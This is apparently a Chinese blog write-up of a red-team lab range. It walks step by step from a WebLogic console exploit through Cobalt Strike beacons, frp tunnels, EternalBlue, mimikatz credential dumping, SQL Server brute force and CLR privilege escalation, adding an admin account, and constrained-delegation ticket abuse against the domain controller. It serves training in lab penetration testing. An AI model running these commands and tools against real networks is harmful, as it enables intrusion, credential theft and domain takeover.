+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.92:7001/console/login/LoginForm.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/139a694f259d70647dc457b13c998754.png" alt="image-20220507150339521"></p>
+<p>利用工具<a href="/console/css/%252e%252e%252fconsole.portal">下载</a>，过于脚本小子了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/45f89c7633482fe0104819179880321d.png" alt="image-20220507152649200"></p>
+<p>执行命令发现是 administrator 权限，并且可以连通外网</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1525634f203e6830fcfd04fd6221f8cc.png" alt="image-20220507152734392"></p>
+<h2 id="2-上线-CS"><a href="#2-上线-CS" class="headerlink" title="2.上线 CS"></a>2.上线 CS</h2><p>直接执行 Powershell 命令上线 CS</p>
+<p>在 VPS 或者虚拟机 kali 上开启 CS server，生成监听器，执行命令</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/387a4c292073f6d5452bdfaa52c6e0e0.png" alt="image-20220507160155736"></p>
+<p>上线</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d32c860123c00b3b4fd2384f9ef5ef25.png" alt="image-20220507160209182"></p>
+<p>通过命令发现存在第二个网卡，是一个内网网段</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/65c0b09ca8f89bb9513db47ad100f96c.png" alt="image-20220507160554444"></p>
+<h2 id="3-内网横向"><a href="#3-内网横向" class="headerlink" title="3.内网横向"></a>3.内网横向</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
+<li><p>抓取主机密码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/06c209be7dcc7ab432985a32c12b91a2.png" alt="image-20220507161002707"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEBLOGIC\Administrator ccef208c6485269c20db2cad21734fe7</span><br></pre></td></tr></table></figure>
+
+<p>靶机为 WinServer 2012 所以不能直接读明文密码</p>
+</li>
+<li><p><strong>判断是否在域内</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5c61b64ed3835c5b205efabf2a14ef41.png" alt="image-20220507162339102"></p>
+<p>判断在工作组中而不是在域中</p>
+<p>使用以下两条命令再确认一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">net config workstation</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8a0847cf7bfae37a8bb822fcf3fff678.png" alt="image-20220507162536101"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ee406d060d9c7182a1f28a838ad7f408.png" alt="image-20220507162502035"></p>
+</li>
+</ul>
+<h3 id="存活探测-amp-漏洞扫描"><a href="#存活探测-amp-漏洞扫描" class="headerlink" title="存活探测&amp;漏洞扫描"></a>存活探测&amp;漏洞扫描</h3><p>CS 导入 Cobalt-Strike-Aggressor-Scripts 插件组，插件下载地址：<strong><a target="_blank" rel="noopener" href="https://github.com/timwhitez/Cobalt-Strike-Aggressor-Scripts">https://github.com/timwhitez/Cobalt-Strike-Aggressor-Scripts</a></strong></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/88b6909ff8e8dd9363104cbb2ae47f0b.png" alt="image-20220507163012012"></p>
+<p>加载之后右击主机列表会出现很多工具</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b90b151806e08a2df57d9c1a2736e292.png" alt="image-20220507163102893"></p>
+<p>向 Victim 机器上传 nbtscan，之后执行 nbtscan 输入目标 10.10.20.0&#x2F;24</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e659690e8de39a69fbc6629284ed1fc9.png" alt="image-20220507163330797"></p>
+<p>发现一台机器 IP 为 10.10.20.7</p>
+<p>通过文件管理上传 fscan 进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell fscan_win32.exe -h 10.10.20.0/24</span><br></pre></td></tr></table></figure>
+
+<p>确定目标机器为 win7 系统，并且存在永恒之蓝</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3a73440dd63a370a116f890d879fb66b.png" alt="image-20220507163928351"></p>
+<h3 id="搭建代理"><a href="#搭建代理" class="headerlink" title="搭建代理"></a>搭建代理</h3><ol>
+<li><p>搭建 Frp 隧道，进行漏洞利用，Kali 上配置 Frps.ini 配置文件</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f0db1cb9f76b182fd52b6d4c13d1a5c6.png" alt="image-20220507164347971"></p>
+<p>启动 Frps</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f88fe2b96977525b12121e0cd9e9fa5f.png" alt="image-20220507164613634"></p>
+</li>
+<li><p>Victim 上传 frpc.exe 和 frpc.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = VPS/kali ip</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<p>启动 frpc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/74c5b88c3e1bda17df18566042555496.png" alt="image-20220507165114178"></p>
+<p>启动之后代理就搭建完毕了，这样攻击者就可以通过跳板机 weblogic 靶机向内网发起访问请求</p>
+</li>
+</ol>
+<h3 id="ms17010"><a href="#ms17010" class="headerlink" title="ms17010"></a>ms17010</h3><p>因为内网 win7 主机存在 ms17010 直接用 msf </p>
+<p>首先拿到 meterpreter 会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; setg Proxies socks5:192.168.43.58:7777</span><br><span class="line">msf6 &gt; setg ReverseAllowProxy true</span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 &gt; set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 &gt; set rhost 10.10.20.7</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>proxy 的 IP 就是 kali 的 IP，rhost 就是内网地址</p>
+<p>在 msf 攻击中可以清晰的看到攻击流程，使用的是目标 smb 445 端口</p>
+<p>第一次以蓝屏终结</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5733fd0ae247e78ce085b23ef76677f3.png" alt="image-20220508105156665"></p>
+<p><strong>MSF永恒之蓝mf17010失败原因</strong></p>
+<ol>
+<li>一次没有成功再多次尝试</li>
+<li>目标机器蓝屏</li>
+<li>MSF payload 为 64 位目标机器也需要 64 位，也 python 有 32 位 的 payload</li>
+<li>永恒之蓝流量比较大</li>
+</ol>
+<p>修改了下 win7 靶机内存调整到了 2G，第二次尝试成功</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a36422f328b7f0ccb490f9303b10f642.png" alt="image-20220508105707845"></p>
+<p>拿到 meterpreter</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c1aa78437073208b5b07a254e74142a8.png" alt="image-20220508105805150"></p>
+<h3 id="抓密码"><a href="#抓密码" class="headerlink" title="抓密码"></a>抓密码</h3><p>加载 mimikatz 读密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">msv</span><br><span class="line">kerberos</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1e893fc7c920aa2fddf24e86af7d463d.png" alt="image-20220508105943889"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c1c02b393b775f3873070238e45dec92.png" alt="image-20220508110552191"></p>
+<p>也可以加载新版 mimikatz - wiki</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/916a442af23806ca7c89784da7bf4c0a.png" alt="image-20220508110643832"></p>
+<p>可以发现没有明文密码，因为 win7 管理员没有登录，所以没有抓取到明文密码，只需要管理员登录机器再次执行命令就可以抓到明文密码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/24630c2ce6b77982ea9aa7c291080786.png" alt="image-20220508111022485"></p>
+<h2 id="4-二层内网域渗透"><a href="#4-二层内网域渗透" class="headerlink" title="4.二层内网域渗透"></a>4.二层内网域渗透</h2><p>PS：因为我的电脑重启地址基本都换了，更新下 IP，需要重新搭 frp 和 msf 连接</p>
+<blockquote>
+<p>server 2012 weblogic：192.168.43.93</p>
+<p>kali：192.168.43.99</p>
+</blockquote>
+<h3 id="win7上线cs"><a href="#win7上线cs" class="headerlink" title="win7上线cs"></a>win7上线cs</h3><p>在 cs 中 win7 中转上线，现在上线 cs 的几种思路</p>
+<ol>
+<li>msf 上传 cs 的后门 exe 执行</li>
+<li>msf 的 meterpeter spawn 到 cs 会话</li>
+<li>cs 通过 ipc$ 上传 cs 后门到 win7 靶机通过计划任务执行</li>
+</ol>
+<p>使用方案一</p>
+<p>1.CS 设置中转监听器</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/01bb266ebb83732c2081794d0476180f.png" alt="image-20220508111333148"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8a6884eb675b6afa7e052f4bd7968742.png" alt="image-20220508111338364"></p>
+<p>2.生成后门</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1f2d5eea0895b1de259889cc6b9fcc07.png" alt="image-20220508131115128"></p>
+<p>把后门上传到 kali，然后在 msf 中使用命令上传到靶机 win7</p>
+<p><strong><img src="https://img-blog.csdnimg.cn/img_convert/4baa7f87ee4a04e38f6909b0c7d58a3d.png" alt="image-20220508132517982"></strong></p>
+<p>进入 shell，执行 beacon.exe</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fa5b114608f357b6f32e03f2ab861bdb.png" alt="image-20220508132547578"></p>
+<p>成功上线 cs</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d2b14865a05a3f994c6339ecbe2dcda6.png" alt="image-20220508132607160"></p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><ul>
+<li>&#96;&#96;&#96;<br>shell whoami<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220508132840943](https://img-blog.csdnimg.cn/img_convert/12afe22796d469144f3460cf54ef126d.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+shell ipconfig<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  发现内网 10.10.10.0/24 段</span><br><span class="line"></span><br><span class="line">  ![image-20220508132931259](https://img-blog.csdnimg.cn/img_convert/54805adf717446c36e389f2f90ded000.png)</span><br><span class="line"></span><br><span class="line">- **判断是否域环境**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+shell ipconfig &#x2F;all<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220508133208864](https://img-blog.csdnimg.cn/img_convert/db34af5ab312f9c6f65eb8ebf667d3dc.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+shell net user &#x2F;domain<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![image-20220508133248296](https://img-blog.csdnimg.cn/img_convert/e40d870b22c1485565e4a46cfb11a176.png)</span><br><span class="line"></span><br><span class="line">- 确定域控主机 IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+net group “Domain Controllers” &#x2F;domain<br>或者 net time &#x2F;domain<br>ping owa -n 2<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![image-20220508133655941](https://img-blog.csdnimg.cn/img_convert/55d83e5cc5fcbc3dbf6231aeafb703e1.png)</span><br><span class="line"></span><br><span class="line">  ![image-20220508133445538](https://img-blog.csdnimg.cn/img_convert/86dc629e56bf721bc246b18d5382c673.png)</span><br><span class="line"></span><br><span class="line">当前进程是没有域管的，所以暂且放弃令牌窃取</span><br><span class="line"></span><br><span class="line">![image-20220508134529747](https://img-blog.csdnimg.cn/img_convert/1264e8d021f1d34c6d2a4df6a5266370.png)</span><br><span class="line"></span><br><span class="line">由于我们已经通过 ms17010 -&gt; mimikatz 拿到了一个域用户的账户密码，尝试查找约束委派的用户</span><br><span class="line"></span><br><span class="line">首先向 win7 靶机上传 adfind 工具</span><br><span class="line"></span><br><span class="line"> ```bash</span><br><span class="line"># 查询配置了非约束委派的主机：</span><br><span class="line">AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"># 查询配置了非约束委派的用户：</span><br><span class="line">AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"># 查询配置了约束委派的主机：</span><br><span class="line">AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"># 查询配置了约束委派的用户：</span><br><span class="line">AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/116c34bb03d87808ac292643985a8c04.png" alt="image-20220508135251614"></p>
+<p>找到了一个 sqlserver 的用户是被设置了约束委派，得想办法搞到这个用户的账密</p>
+<p>上传 fscan.exe 到靶机进行信息收集和漏洞扫描</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c942aa4136fb566135a2dedc25fcef44.png" alt="image-20220508154210862"></p>
+<blockquote>
+<p>PS：如果没有扫到 1433 端口，就进虚拟机把 SQL server 启动，启动不了</p>
+<p>看这篇文章：<a href="https://link.juejin.cn/?target=https://www.fengjunzi.com/blog-25573.html">链接</a>，因为过试用期了，需要升级重新输入密码</p>
+<p>正常启动</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/774c84d30e556aa9241040f6b1b5b127.png" alt="image-20220508154057558"></p>
+</blockquote>
+<p>根据他开放的端口尝试以下操作：</p>
+<ol>
+<li>80 端口 web 漏洞</li>
+<li>1433 SQL server 漏洞</li>
+<li>445 smb 等端口系统漏洞</li>
+</ol>
+<p>其他拿域控思路：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/maa01jOdXw_G_4uJ-_YZXg">域控被突破的几种途径v2</a></p>
+<h3 id="二层Frp代理"><a href="#二层Frp代理" class="headerlink" title="二层Frp代理"></a>二层Frp代理</h3><p><strong>现在尝试 80 端口漏洞</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9b86bb5c67caaa0eb198584eec49e631.png" alt="image-20220508161840412"></p>
+<ol>
+<li><p>搭建使用 frp 多层代理，修改 weblogic 的 frp 配置文件，weblogic 既是客户端，也是服务端，需要修改 frps.ini，通过 cs 上传 frps 和 frps.ini </p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a367563e507a3f034b0f0f1ccac95772.png" alt="image-20220508155905811"></p>
+<p>启动 frps</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell frps.exe -c frps.ini</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数据服务器开启 frpc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 10.10.20.12</span><br><span class="line">server_port = 1111</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<p>建立链接</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/968eddd5fb0a1d42c28dcef289da251a.png" alt="image-20220508162507851"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a1c326e00ef08d6044fbeaffee2a26fe.png" alt="image-20220508162514238"></p>
+</li>
+<li><p>在攻击者的 windows 电脑上可以用 proxifier 设置代理链</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1333ef1bf22ffe4641e66e9b7c32da93.png" alt="image-20220508162704748"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/8cfc19e7dd68cea57c7d5b4e501c3476.png" alt="image-20220508162717407"></p>
+<p>在攻击者的 windows 电脑上可以正常访问 10.10.10.18</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6a4a64f75b78a08e5dd25dceb79c95cb.png" alt="image-20220508162922505"></p>
+</li>
+</ol>
+<p>发现 80 端口并没有什么利用点，尝试利用 SQL sever，因为现在搭建了二层代理所以部分操作可以用 windows 物理机直接攻击</p>
+<h3 id="打数据服务器SQL-server"><a href="#打数据服务器SQL-server" class="headerlink" title="打数据服务器SQL server"></a>打数据服务器SQL server</h3><p>尝试爆破 SQL server 密码</p>
+<p>使用工具成功爆破用户密码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c86b9fd9c6de214ab6d1ae4f49bcb06d.png" alt="image-20220508163342992"></p>
+<p>可以看到流量被转发</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/03fdc9c84e8e7e87995b8d3c80f64d9e.png" alt="image-20220508163339943"></p>
+<p>这样就拿到了域控主机的 SQL server 密码</p>
+<p>随后利用 <a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpSQLTools/releases/tag/41">SharpSQLTools.exe</a> 工具对其进行 xp_cmdshell 调用系统命令，或者 SqlKnife 这个工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SharpSQLTools.exe 10.10.10.18 sa sa master xp_cmdshell whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b6c72ab3586150c1979c1565fe0529e1.png" alt="image-20220508164101746"></p>
+<p>却认为域控 ip</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/069317cf5d6c5ce468e149e6b66148ea.png" alt="image-20220508164215612"></p>
+<p>目前的权限是<code>nt authority\network service</code> 即为普通服务权限，</p>
+<blockquote>
+<p>由于目标机器不出网不存在让他下载我们的 exe，随后使用 MSF + Proxychains 调用 xpcmdshell 模块上线到 MSF，但是失败了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3d8fcf2b2391f0daf9842b55a4938c85.png" alt="image-20220508164827961"></p>
+<p>既然上线失败且目标是 iis，那么想办法找到 iis 到目录写个一句话吧</p>
+<p>一般 iis 的目录是：<code>C:\inetpub\wwwroot</code>，那么查看下是否存在</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1d60d5dee831bc2c8e23867617f451b4.png" alt="image-20220508165057165"></p>
+<p>确实存在此目录，尝试写入文件，权限太小失败</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/498ee7ee42cf07fc69323991f67d2078.png" alt="image-20220508165248135"></p>
+<p>在 MSSQL 中使用 CLR 组件提权，提权原理可以看这篇文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/250346">https://www.anquanke.com/post/id/250346</a></p>
+<p>在搜这个提权的时候还发现了一个华点就是搜关键词 install_clr 就可以搜到这个靶场的 wp</p>
+<p>使用 SharpSQLTools 开启目标 clr，进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpSQLTools.exe 10.10.10.18 sa sa master install_clr <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9bc05fd0b2ce2fbb4013621e7c05d245.png" alt="image-20220508165906554"></p>
+<p>然后启用并调用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SharpSQLTools.exe 10.10.10.18 sa sa master enable_clr</span><br><span class="line">SharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d412192364596aaf3c2d6f7870eaeedd.png" alt="image-20220508170007322"></p>
+<p>提权成功，只能说太牛皮了</p>
+<p>添加一个管理员权限用户，用户名为 ocean.com 密码为 qwe.123</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato &quot;net user ocean.com qwe.123 /add&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f04f800faa76bc14fdcb66ca6b4e0eaf.png" alt="image-20220508170331564"></p>
+<p>升级为 admin 组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato &quot;net localgroup administrators ocean.com /add&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4e58c6005c44c8dd6f21b3ea2375090a.png" alt="image-20220508170508054"></p>
+<p>查看用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato &quot;net user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/307f38106054b70103329cc532fb1536.png" alt="image-20220508170619457"></p>
+<blockquote>
+<p>其他师傅试了多种方法都不行，他们最终选择了 msf，我就直接用 msf 了，其他师傅的文章可以在参考连接中找到</p>
+</blockquote>
+<h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p>漏洞利用拿下的 win7 做中继，用 CS 生成马，通过 meterpreter 传上去 msf 的 payload，但是需要首先为 kali 设置代理，因为之前使用 frp 搭建了二层隧道，所以这里只需要设置 proxychains 的配置文件即可</p>
+<p>1.设置 kali proxychains 代理保证 kali msf 可以访问到 10.10.10.18</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>代理链就和 Windows 物理机一样</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1a498e32d4a5036d366e0887dde0333b.png" alt="image-20220508172723808"></p>
+<p>2.上线 msf</p>
+<p>使用代理启动 msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>使用 mssql_clr_payload 模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mssql/mssql_clr_payload</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/726f210a987afbf931b7d9695bfa704a.png" alt="image-20220508172257116"></p>
+<p>3.生成中转上线的 cs 马，新建一个监听器，这里需要多层代理</p>
+<p>生成 beacon.exe</p>
+<p>4.通过 msf 上传 beacon.exe 并且执行，上线 sc，但是只有服务权限</p>
+<p>使用 SharpSQLTools.exe 去执行 beacon，获取高权限用户，拿到 SQL server 主机</p>
+<h2 id="5-域内委派拿域控"><a href="#5-域内委派拿域控" class="headerlink" title="5.域内委派拿域控"></a>5.域内委派拿域控</h2><p>cs 中拿到用户密码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5afe8cbae21133e1c7e51738c5e275fb.png" alt="image-20220509080607350"></p>
+<p>之前信息搜集的时候我们知道 <code>sqlserver</code> 是一个约束委派的用户，我们可以通过约束委派攻击来接管域控</p>
+<p>通过 cs 上传工具 kekeo，利用 kekeo 请求该用户的 TGT：<code>TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="string">&quot;tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用这张 TGT (<code>TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code>) 获取域机器的 ST：<code>TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</code></p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="string">&quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/16f1fffa49d4a716d55f2c7a337faf31.png" alt="image-20220509082530523"></p>
+<p>使用 mimikatz 将 ST2 导入当前会话即可，运行 mimikatz 进行 ptt：</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1fece20a25a8d35fa088584fa6f91fcb.png" alt="image-20220509082625206"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/42c7e47bd5c09d227728b21ba0ea006a.png" alt="image-20220509082653026"></p>
+<p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="http://moonflower.fun/index.php/2022/03/06/300/">http://moonflower.fun/index.php/2022/03/06/300/</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ">https://mp.weixin.qq.com/s/dcYbIfLwN-Aw0Z9XxQSGkQ</a></p>
+<p><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/2edac2bc38860fa97386f7c27">https://xie.infoq.cn/article/2edac2bc38860fa97386f7c27</a></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d717a424deb896a4ca97a7f1f83da1f8.png"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
